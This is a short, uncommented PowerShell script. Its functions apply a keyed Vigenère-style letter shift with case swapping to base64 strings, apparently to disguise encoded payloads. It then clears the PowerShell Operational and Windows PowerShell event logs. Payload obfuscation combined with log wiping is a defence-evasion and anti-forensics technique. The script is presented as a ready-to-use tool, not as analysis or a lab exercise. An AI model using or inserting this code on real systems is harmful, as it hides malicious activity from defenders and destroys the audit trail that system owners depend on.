function obfuscate-base64 ($key,$string) { $alpha = @{ "1" = "A"; "2" = "B"; "3" = "C"; "4" = "D"; "5" = "E"; "6" = "F"; "7" = "G"; "8" = "H"; "9" = "I"; "10" = "J"; "11" = "K"; "12" = "L"; "13" = "M"; "14" = "N"; "15" = "O"; "16" = "P"; "17" = "Q"; "18" = "R"; "19" = "S"; "20" = "T"; "21" = "U"; "22" = "V"; "23" = "W"; "24" = "X"; "25" = "Y"; "26" = "Z"; }; $inv_alpha = @{}; foreach ($l in $alpha.Keys) { $inv_alpha.Add($alpha[$l],$l) }; $count = 0; foreach ($ch in $string.GetEnumerator()) { $c = [string]$ch; if ($c -match "[a-zA-Z]") { $ival = $inv_alpha[$c]; $s = $key[$count]; if (!$s) { $count = 0; $s = $key[0] }; $ss = [string]$s; $S = $ss.ToUpper(); $shift = $inv_alpha[$S]; $val = [int]$ival - [int]$shift; if ([int]$val -lt "1") { $val = [int]$val + "26" }; if ([int]$val -gt "26") { $val = [int]$val - "26" }; $sval = [string]$val; $char = $alpha[$sval]; $schar = [string]$char; if ($c -cmatch "[a-z]") { $cipher = $schar.ToUpper(); $ncipher += [string]::Join("",($cipher)) } elseif ($c -cmatch "[A-Z]") { $cipher = $schar.ToLower(); $ncipher += [string]::Join("",($cipher)) }; $count++; } else { $ncipher += [string]::Join("",($c)) } }; $scipher = [string]$ncipher; return $scipher; } function obfuscate-string ($key,$b64o) { $b64n = obfuscate-base64 $key $b64o; return $b64n; }; Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"; Clear-EventLog "Windows Powershell";
